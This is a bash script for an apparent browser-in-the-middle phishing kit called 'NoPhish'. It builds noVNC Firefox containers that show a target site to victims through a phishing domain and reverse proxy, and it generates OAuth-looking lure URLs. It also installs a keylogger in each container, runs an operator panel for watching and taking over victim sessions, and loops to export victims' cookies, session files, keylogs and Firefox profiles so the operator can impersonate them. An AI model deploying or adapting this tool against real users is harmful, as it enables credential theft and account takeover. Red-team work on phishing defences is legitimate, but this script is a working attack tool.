#!/bin/bash

	helpFunction()
	{
	   echo ""
	   echo "Usage: $0 -u No. Users -d Domain -t Target"
	   echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
	   echo -e "\t -d Domain which is used for phishing"
	   echo -e "\t -t Target website which should be displayed for the user"
	   echo -e "\t -e Export format"
	   echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
	   echo -e "\t -c Full path to the pem file of the ssl certificate"
	   echo -e "\t -k Full path to the key file of the ssl certificate"
	   echo -e "\t -a Adjust default user agent string"  
	   echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
	   exit 1 # Exit script after printing help
	}
	
	while getopts "u:d:t:s:c:k:e:a:z:p:" opt
	do
		case "$opt" in
		u ) User="$OPTARG" ;;
		d ) Domain="$OPTARG" ;;
		t ) Target="$OPTARG" ;;
		e ) OFormat="$OPTARG" ;;
		s ) SSL="$OPTARG" ;;
		c ) cert="$OPTARG" ;;
		k ) key="$OPTARG" ;;
		a ) useragent=$OPTARG ;;
		z ) rzip=$OPTARG ;;
		p ) param=$OPTARG ;;
		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
		esac
	done



# Begin script in case all parameters are correct

# Loop for every user a docker container need to be started 
 
# Write of default config for apache

case "$1" in 

"install")
	sudo docker build -t vnc-docker -f ./VNC-Dockerfile ./
	sudo docker build -t rev-proxy -f ./PROXY-Dockerfile ./
	;;
"cleanup")
	sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q)
	sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q)
	while true; do
	    read -p "Do you want to perform a full cleanup? " yn
	    case $yn in
	    [Yy]* ) 
			sudo docker rmi -f $(sudo docker images --filter=reference="vnc-docker" -q)
			sudo docker rmi -f $(sudo docker images --filter=reference="rev-proxy" -q)
			exit;;
	    [Nn]* ) exit;;
	    * ) echo "Please answer yes or no.";;
	esac
	done
	;;
*)
	
	# Print helpFunction in case parameters are empty
	if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]
	then
		echo "Some or all of the parameters are empty";
		helpFunction
	fi
	
	if [ -z "$rzip" ]
	then
		rzip=true
	fi
	
	if [ -n "$SSL" ]
	then
		if [ -z "$cert" ] || [ -z "$key" ]
		then
		echo "Some or all of the parameters are empty";
		helpFunction
		elif [ ! -f "$cert" ] || [ ! -f "$key" ]
		then 
		echo "Certificate and / or Key file could not be found."
		exit 1
		fi
	fi

	START=1
	END=$User
	
	temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
	pagetitle="${temptitle:1}"
	
	curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
	icopath="./novnc.ico"
	
	printf "[-] Configuration file generating\033[0K\r" 
	echo 'NameVirtualHost *
             Header unset ETag
             Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
             Header set Pragma "no-cache"
             Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
	     ' > ./proxy/000-default.conf
	
	if [ -n "$SSL" ]
	then
		echo "<VirtualHost *:443>" >> ./proxy/000-default.conf
		echo "
		SSLEngine on
  		SSLProxyEngine on
	   	SSLCertificateFile /etc/ssl/certs/server.pem
	   	SSLCertificateKeyFile /etc/ssl/private/server.key
		" >> ./proxy/000-default.conf
		echo '
		RewriteEngine On
    		RewriteMap redirects txt:/tmp/redirects.txt
    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
    		RewriteRule ^ ${C:1}? [R=302]
    		
    		<Location /status.php>
		    Deny from all
		</Location>
		' >> ./proxy/000-default.conf
	else
		echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
		echo '
		RewriteEngine On
    		RewriteMap redirects txt:/tmp/redirects.txt
    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
    		RewriteRule ^ ${C:1}? [R=302]
		
		<Location /status.php>
		    Deny from all
		</Location>
		' >> ./proxy/000-default.conf
	fi
	 
        printf "[+] Configuration file generated \n" 
        
        htmlpath="./output/status.php"
        if [ -e $htmlpath ]
        then
        	rm -rf $htmlpath
        fi
        
        echo '
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=0.3">
  <style>
  
    body {
      background: #101f30;
    }
    
    /* Style the iframe container */
    .iframe-container {
      display: flex;
      flex-wrap: wrap;
      position: relative; /* Set container as the positioning context for absolute positioning */
    }

    /* Style each iframe wrapper */
    .iframe-wrapper {
      position: relative; /* Ensure relative positioning for absolute positioning inside */
      width: calc(50% - 2%); /* Adjust width as needed */
      margin: 1%; /* Adjust margin as needed */
      box-sizing: border-box; /* Include padding and border in the width and height */
    }

    /* Style each iframe */
    .custom-iframe {
      height: 500px;
      width: 100%; /* Make iframe take 100% width of its container */
      border: 1px solid #ccc;
      border-radius: 10px;
    }

    /* Style the buttons inside the iframe wrapper */
    .iframe-buttons {
      position: absolute;
      bottom: 10px; /* Adjust the distance from the bottom as needed */
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
    }

    .iframe-button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      margin: 5px; /* Adjust margin as needed */
      display: none; /* Initially hide the buttons */
      text-decoration: none;
      font-size: 16px; /* Adjust font size as needed */
      font-family: "Arial", sans-serif; /* Adjust font family as needed */
      font-weight: bold; /* Adjust font weight as needed */
      border-radius: 5px;
    }

    /* Show the buttons when hovering over the iframe wrapper */
    .iframe-wrapper:hover .iframe-buttons .iframe-button {
      display: block;
    }

    /* Media query for smaller screens */
    @media screen and (max-width: 1500px) {
      .iframe-wrapper {
        width: 100%; /* Set to 100% width for smaller screens */
        margin: 2% 0; /* Adjust margin as needed */
      }
    }
  </style>
</head>

<body>
 <?php
    if (isset($_POST["create_file"])) {
        // Get the value of the file content from the form input
        $file_content = $_POST["file_content"];
        $file_content2 = $_POST["file_content2"];
	$ip = $_POST["ip_value"];
        // Specify the file path and name
        $file_path = "/tmp/redirects.txt";
        $ip_path = "/tmp/disconnect.txt";

        if (file_exists($ip_path)) {
            // Read the existing content of the file
            $ipfile_content = file_get_contents($ip_path);

            // Check if the new content is already in the file
            if (strpos($ipfile_content, $ip) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $ipfile_handle = fopen($ip_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($ipfile_handle, $ip . PHP_EOL);

                // Close the file handle
                fclose($ipfile_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
        } else {
            // If the file does not exist, create a new file
            $ipfile_handle = fopen($ip_path, "w") or die("Unable to create file!");
	    
            // Write the content to the file
            fwrite($ipfile_handle, $ip . PHP_EOL);

            // Close the file handle
            fclose($ipfile_handle);

            // echo "<p>File created successfully!</p>";
        }




        // Check if the file exists
        if (file_exists($file_path)) {
            // Read the existing content of the file
            $existing_content = file_get_contents($file_path);

            // Check if the new content is already in the file
            if (strpos($existing_content, $file_content) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($file_handle, $file_content . PHP_EOL);

                // Close the file handle
                fclose($file_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
            
            // Check if the new content is already in the file
            if (strpos($existing_content, $file_content2) !== false) {
                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
            } else {
                // If the new content is not a duplicate, open the file in append mode to add content at the end
                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");

                // Write the content to the file
                fwrite($file_handle, $file_content2 . PHP_EOL);

                // Close the file handle
                fclose($file_handle);

                // echo "<p>File operation completed successfully!</p>";
            }
        } else {
            // If the file does not exist, create a new file
            $file_handle = fopen($file_path, "w") or die("Unable to create file!");
	    
            // Write the content to the file
            fwrite($file_handle, $file_content . PHP_EOL);
	    fwrite($file_handle, $file_content2 . PHP_EOL);
            // Close the file handle
            fclose($file_handle);

            // echo "<p>File created successfully!</p>";
        }
    }
    ?>

    <div class="iframe-container">
	' > ./output/status.php
        
	declare -a urls=()
	printf "[-] Starting containers \033[0K\r\n"  
	for (( c=$START; c<=$END; c++ ))
	do
	    PW=$(openssl rand -hex 14)
	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
	    Token=$(cat /proc/sys/kernel/random/uuid)
	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker  &> /dev/null 
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
	    if [ -n "$useragent" ]
	    then
	    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
	    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/
	    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
	    else
	    	echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
	    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
	    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
	    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "	    	  
	    fi
	    
	    sleep 1
	    
	    if [ -n "$pagetitle" ]
	    then
	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
	    fi
	    
	    if [ -e $icopath ]
	    then
	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
	    	
	    fi
	    
	    # Keylogger
	    sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/   
	    sleep 1
	    sudo docker exec -dit vnc-user$c sh -c "python3 /home/headless/logger.py"     
	    
	    
	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
	    
	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
	    if [ -n "$SSL" ]
	    then
		echo "
		<!DOCTYPE html>
		<html lang='en'>
		<head>
		    <meta charset='UTF-8'>
		    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
		    <link rel='icon' href='https://$Domain/favicon.ico' type='image/x-icon'>
		    
		    <title>$pagetitle</title>
		    
		    <style>
			body, html {
			    height: 100%;
			    margin: 0;
			    overflow: hidden;
			}
			iframe {
			    width: 100%;
			    height: 100%;
			    border: none;
			}
		    </style>
		    <script>
			function resizeIframe() {
			    var iframe = document.getElementById('myIframe');
			    iframe.style.height = window.innerHeight + 'px';
			    iframe.style.width = window.innerWidth + 'px';
			}

			window.onload = function () {
			    resizeIframe(); // Resize on initial load
			    window.addEventListener('resize', resizeIframe); // Resize on window resize
			};
		    </script>
		</head>
		<body>
		    <iframe id='myIframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
		</body>
		</html>
		" > ./proxy/iframe$c.html
	    else
		echo "
		<!DOCTYPE html>
		<html lang='en'>
		<head>
		    <meta charset='UTF-8'>
		    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
		    <link rel='icon' href='http://$Domain/favicon.ico' type='image/x-icon'>
		    <title>$pagetitle</title>
		    <style>
			body, html {
			    height: 100%;
			    margin: 0;
			    overflow: hidden;
			}
			iframe {
			    width: 100%;
			    height: 100%;
			    border: none;
			}
		    </style>
		    <script>
			function resizeIframe() {
			    var iframe = document.getElementById('myIframe');
			    iframe.style.height = window.innerHeight + 'px';
			    iframe.style.width = window.innerWidth + 'px';
			}

			window.onload = function () {
			    resizeIframe(); // Resize on initial load
			    window.addEventListener('resize', resizeIframe); // Resize on window resize
			};
		    </script>
		</head>
		<body>
		    <iframe id='myIframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
		</body>
		</html>
		" > ./proxy/iframe$c.html
	    fi
	    echo "
	    	RewriteCond %{REQUEST_URI} /v$c
    		RewriteRule ^/(.*) /iframe$c.html [P]
	    " >> ./proxy/000-default.conf
	    
	    echo "
		<Location /$PW>
		ProxyPass http://$CIP:6901
		ProxyPassReverse http://$CIP:6901
		</Location>
		<Location /$PW/websockify>
		ProxyPass ws://$CIP:6901/websockify keepalive=On
		ProxyPassReverse ws://$CIP:6901/websockify
		</Location>
		ProxyTimeout 600
		Timeout 600
	" >> ./proxy/000-default.conf
	    printf "[-] Starting containers $c of $END\033[0K\r"

	    
	    if [ -n "$SSL" ]
	    then
		echo "
		    <div class='iframe-wrapper'>
		      <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
		      <!-- Form for file creation -->
		      <form method='post'>
			<!-- Buttons inside the wrapper -->
			<div class='iframe-buttons'>
			  <a class='iframe-button' href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
			  <input type='hidden' name='ip_value' value='$CIP'>
			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
			  <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
			</div>
		      </form>
		    </div>		    
		" >> ./output/status.php
		if [ -n "$param" ]
		then
		urls+=("https://$Domain/v$c/$param")
		else
		urls+=("https://$Domain/v$c/oauth2/authorize?access-token=$Token")
		fi
	    else
		echo "
		    <div class='iframe-wrapper'>
		      <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
		      <!-- Form for file creation -->
		      <form method='post'>
			<!-- Buttons inside the wrapper -->
			<div class='iframe-buttons'>
			  <a class='iframe-button' href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
			  <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
			  <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
			  <input type='hidden' name='ip_value' value='$CIP'>
			  <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
			  <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
			</div>
		      </form>
		    </div>
		" >> ./output/status.php
		if [ -n "$param" ]
		then
		urls+=("http://$Domain/v$c/$param")
		else
		urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
		fi
	    fi
	done
	echo "
	    </div>
	</body>
	</html>
        " >> ./output/status.php
	echo "</VirtualHost>" >> ./proxy/000-default.conf

        
        if [ -n "$SSL" ]
	then
		apachefile="./proxy/000-default.conf"
        	awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":443", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
		awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
	else
		apachefile="./proxy/000-default.conf"
        	awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":80", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
		awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
	fi
        

	cat temp2.txt >> ./proxy/000-default.conf
	
	rm -r ./temp.txt
	rm -r ./temp2.txt

        printf "[+] VNC Containers started                          \n"  
        printf "[-] Starting reverse proxy \033[0K\r\n"  
	# start of rev proxy
	if [ -n "$SSL" ]
	then
		sudo docker run -dit -p443:443 -p65534:65534 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
	else
		sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
	fi
	
	sleep 5

	if [ -n "$SSL" ]
	then
		sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.pem
		sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
	fi
	
	sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
	sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
	for (( d=$START; d<=$END; d++ ))
	do
		sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
	done
	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
	
	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
        sudo docker exec rev-proxy /bin/bash -c "cron"
        sleep 3
        sudo docker exec rev-proxy /bin/bash -c "crontab"
        sudo docker cp ./output/status.php rev-proxy:/var/www/html/
        rm -r ./novnc.ico
        printf "[+] Reverse proxy running \033[0K\r\n"  
        	if [ -n "$SSL" ]
	then
		printf "[+] Admin interface available under https://$Domain:65534/status.php            \n"
	else
		printf "[+] Admin interface available under http://$Domain:65534/status.php            \n"
	fi
        
        printf "    Login with: \n"
        printf "    Username: angler \n"
        printf "    Password: $AdminPW  \n"  
	printf "[+] Setup completed \n"
	printf "[+] Use the following URLs:\n"   
	for value in "${urls[@]}"
	do
		echo $value
	done
	
	dbpath="./output/phis.db"

        if [ -e $dbpath ]
        then
        	rm -rf $dbpath
        fi
	
	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
	printf "[+] You can check and view the open session by use of the status.php in the output directory\n" 
	#Start a loop which copies the cookies from the containers
	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
	sleep 60
	while :
	do
	for (( c=$START; c<=$END; c++ ))
	do
           pushd ./output &> /dev/null
           sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
           sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
           sudo docker exec vnc-user$c test -e /home/headless/Keylog.txt && sudo docker cp vnc-user$c:/home/headless/Keylog.txt ./user$c-keylog.txt
           sleep 2
           sudo docker cp vnc-user$c:/home/headless/recovery.jsonlz4 ./user$c-recovery.jsonlz4
           sudo docker cp vnc-user$c:/home/headless/cookies.sqlite ./user$c-cookies.sqlite
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/recovery.jsonlz4"
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/cookies.sqlite"
           sleep 2
           if [ -n "$OFormat" ]
	   then
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 simple
		python3 ./cookies-collector.py ./user$c-cookies.sqlite simple
	   else
		sudo docker exec vnc-user$c sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
		sudo docker cp vnc-user$c:/home/headless/ffprofile ./phis$c-ffprofile
		sudo docker exec vnc-user$c sh -c "rm -rf /home/headless/ffprofile"
		sudo chown -R 1000 ./phis$c-ffprofile
		
		if [ "$rzip" = true ] 
		then
		   zip -r phis$c-ffprofile.zip phis$c-ffprofile/ &> /dev/null
		   rm -r phis$c-ffprofile/
		fi
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 default
		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
	   
	   fi

	   
           rm -r -f ./user$c-recovery.jsonlz4 
           rm -r -f ./user$c-cookies.sqlite
           rm -r -f ./user$c-cookies.sqlite*
           python3 ./status.py $c "${urls[$(($c - 1))]}"
	   
	   popd &> /dev/null
	done

	sleep 60
	echo -e "\033[$((($c * 3) - 2))A"
	done

	;;
esac
